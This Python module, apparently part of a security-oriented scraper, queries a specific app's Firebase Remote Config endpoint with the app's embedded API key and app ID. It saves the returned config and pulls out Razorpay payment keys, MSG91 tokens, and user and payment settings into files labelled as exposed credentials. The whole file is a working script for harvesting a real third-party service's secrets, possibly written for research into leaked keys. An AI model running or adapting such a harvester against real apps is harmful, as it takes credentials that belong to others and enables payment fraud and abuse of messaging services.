from __future__ import annotations

import json
from pathlib import Path

from scraper.client import APP_ID, API_KEY, http
from scraper.utils import save_json

RC_URL = (
    "https://firebaseremoteconfig.googleapis.com/v1/projects/"
    "544458187694/namespaces/firebase:fetch"
)


def scrape_secrets(data_dir: Path) -> None:
    out = data_dir / "secrets"
    out.mkdir(parents=True, exist_ok=True)

    _, raw = http(
        "POST",
        f"{RC_URL}?key={API_KEY}",
        {"appId": APP_ID, "appInstanceId": "security-scrape"},
        {"Content-Type": "application/json"},
    )
    entries = json.loads(raw).get("entries", {})
    save_json(out / "live-remote-config.json", json.loads(raw))

    def dump(name: str, keys: list[str]) -> None:
        save_json(out / name, {k: entries[k] for k in keys if k in entries})

    dump("credentials-exposed.json", [
        "razorpay_key", "razorpay_key_dev", "msg91_token", "msg91_widget_id", "msg91_widget_id_dev",
    ])
    dump("user-config-exposed.json", ["age_group_list", "dev_device_id", "fcm_topic_data", "show_login_as_nudge"])
    dump("payment-config-exposed.json", [
        "google_play_product_json_data", "payment_state_check_data",
        "top_auto_pay_upi_apps_json_data", "top_auto_pay_upi_apps_json_data_v1",
        "subscription_cancel_benefits", "show_mini_checkout",
    ])
    print(f"  secrets: {len(entries)} remote config keys")
